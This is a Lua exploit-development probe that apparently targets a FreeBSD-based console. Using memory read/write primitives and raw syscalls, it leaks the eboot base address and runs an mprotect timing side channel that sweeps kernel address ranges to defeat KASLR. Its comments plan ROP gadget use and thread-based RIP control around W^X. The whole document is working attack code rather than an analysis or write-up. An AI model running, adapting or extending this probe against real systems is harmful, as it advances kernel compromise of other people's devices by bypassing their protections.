-- CRASH_CLASS: MODERATE
-- PROBE 56i: Thread-based high-resolution timer for KASLR side channel
--
-- clock_gettime has ~90us overhead per call (syscall round-trip).
-- Strategy: use a child thread as a high-resolution counter.
-- 1. Map a shared page
-- 2. Start a child thread that increments a counter in a tight loop
-- 3. Main thread reads counter before and after a target syscall
-- 4. The delta in counter value ~ elapsed time at sub-microsecond resolution
--
-- Uses thr_create(430) for the child and Atomic_fetch_add_8 as the
-- increment gadget (confirmed working in probes 126g/126h).

print("=== PROBE 56i: THREAD TIMER KASLR ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- ============ SETUP ============

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

-- Allocate shared counter page + stack for child
local sc_mmap = mk(477)
local counter_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local cp = N(counter_page)
print(string.format("counter_page=0x%X", cp))

-- Zero the counter
wq(counter_page, uint64(0))
-- Also put a "run" flag at offset 8: 1=run, 0=stop
wd(cp + 8, 1)

-- Child thread stack
local child_stack = sc_mmap(uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local stack_top = N(child_stack) + 0x10000 - 0x100
print(string.format("child_stack_top=0x%X", stack_top))

-- Find Atomic_fetch_add_8 gadget in eboot
-- From 126g/126h: this is a "lock xadd [rdi], rsi; mov rax, rsi; ret"
-- We need to find it. The entry point from 649 member type 7 maybe?
-- Actually, let's use a different approach: find a simple increment loop.
--
-- For the child thread, we need RIP pointing to code that:
--   1. Reads the counter address from rdi (or a fixed location)
--   2. Increments it in a loop
--   3. Checks a stop flag
--
-- Since we can't write executable code (W^X), we need to find
-- existing code in eboot that does something like this.
--
-- Alternative simpler approach: use the child thread to execute
-- a gadget that does: mov [rdi], rax; ret (from 156d)
-- But we need it in a LOOP.
--
-- Actually the simplest approach: make the child call a syscall
-- in a loop. thr_create gives us RIP control. We point RIP to
-- a function that increments our counter.
--
-- BUT: we need the function to LOOP. Without W^X bypass, we need
-- a naturally-looping function in eboot.
--
-- ALTERNATIVE: use the confirmed Atomic_fetch_add_8 from C11 threading.
-- From 126g: Thrd_create takes a function pointer and arg.
-- We used Atomic_fetch_add_8 as the function — it increments once
-- and returns. That's not a loop.
--
-- SIMPLEST APPROACH: just use thr_create to start a thread with RIP
-- pointing to a "lock inc qword [rdi]; jmp -7" but we can't write that.
--
-- Let's try a different timing method: use the CHILD thread to make
-- syscalls instead. Start child, have it make madvise on different
-- kernel addrs. Main thread measures total time for N iterations
-- using clock_gettime (we only need ONE clock_gettime pair, not per-call).

-- Actually, let's step back. The real approach is:
-- 1. Start child thread spinning (incrementing counter via some eboot code)
-- 2. Main thread reads counter, does target syscall, reads counter again
-- 3. Delta = high-res timing

-- For the increment loop, we need to find a FUNCTION in eboot that
-- spins. Let's look for spinlock-like code, or use thr_create to
-- point at a function that will naturally loop or block.

-- OK new idea: use the counter directly from main thread.
-- Instead of a thread-timer, do a BATCH measurement:
-- Make 1000 calls to madvise(kernel_addr), measure total time
-- with a single clock_gettime pair. This amortizes the overhead.

print("")
print("--- BATCH TIMING (1000 calls per address, clock_gettime wrapper) ---")

local sc_clock = mk(232)
local ts = memory.alloc(16)

local function get_nsec()
    wq(ts, uint64(0))
    wq(uint64(N(ts) + 8), uint64(0))
    sc_clock(uint64(4), uint64(N(ts)))
    local sec = rd(N(ts))
    local nsec = rd(N(ts) + 8)
    if not sec or not nsec then return 0 end
    return sec * 1000000000 + nsec
end

local sc_madvise = mk(75)
local sc_mincore = mk(78)
local sc_mprot = mk(74)
local vec = memory.alloc(256)

local BATCH = 1000

-- Test addresses: sweep the kernel range at 0x10_0000_0000 intervals
-- to look for timing anomalies
local kern_sweep = {}
for hi = 0xFFFF8000, 0xFFFFF000, 0x800 do
    kern_sweep[#kern_sweep + 1] = {hi = hi, lo = 0}
end
-- Add finer sweep around the typical FreeBSD kernel base (0xFFFFF800_00000000)
for off_mb = 0, 1024, 64 do
    kern_sweep[#kern_sweep + 1] = {hi = 0xFFFFF800, lo = off_mb * 0x100000}
end
-- And userland reference
kern_sweep[#kern_sweep + 1] = {hi = 0x00000001, lo = 0}

print(string.format("Testing %d addresses, %d calls each", #kern_sweep, BATCH))

-- Use madvise since it showed delta=1 for userland (meaning it touches the VM subsystem)
-- Actually, for kernel addrs madvise gives delta=0, meaning it rejects early.
-- Use mprotect instead — it returned ret=0 with delta=1 for ALL kernel addrs.
-- mprotect touching the VM subsystem means the kernel actually does a page table walk.

print("")
print("--- mprotect(PROT_READ) batch timing ---")

local timing_data = {}

for idx, t in ipairs(kern_sweep) do
    local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))

    local before = get_nsec()
    for i = 1, BATCH do
        pcall(function() sc_mprot(addr, uint64(0x4000), uint64(1)) end)
    end
    local after = get_nsec()

    local total_ns = after - before
    local per_call = math.floor(total_ns / BATCH)
    timing_data[idx] = per_call

    -- Only print interesting results (first few + any outliers)
    if idx <= 5 or idx == #kern_sweep then
        print(string.format("  0x%08X%08X: %d ns/call (total %d ms)",
            t.hi, t.lo, per_call, math.floor(total_ns / 1000000)))
    end
end

-- Find min and max timing
local min_t, max_t = timing_data[1], timing_data[1]
local min_idx, max_idx = 1, 1
for i, t in ipairs(timing_data) do
    if t < min_t then min_t = t; min_idx = i end
    if t > max_t then max_t = t; max_idx = i end
end

print(string.format("\n  FASTEST: 0x%08X%08X at %d ns/call",
    kern_sweep[min_idx].hi, kern_sweep[min_idx].lo, min_t))
print(string.format("  SLOWEST: 0x%08X%08X at %d ns/call",
    kern_sweep[max_idx].hi, kern_sweep[max_idx].lo, max_t))
print(string.format("  SPREAD: %d ns (%d%%)", max_t - min_t,
    min_t > 0 and math.floor((max_t - min_t) * 100 / min_t) or 0))

-- If spread > 5%, print all timings for analysis
if min_t > 0 and (max_t - min_t) * 100 / min_t > 5 then
    print("\n  Full timing dump (>5% spread detected):")
    for i, t in ipairs(timing_data) do
        if t > min_t * 1.03 or t < min_t * 0.97 then
            print(string.format("    [%d] 0x%08X%08X: %d ns/call ***",
                i, kern_sweep[i].hi, kern_sweep[i].lo, t))
        end
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56i COMPLETE ===")
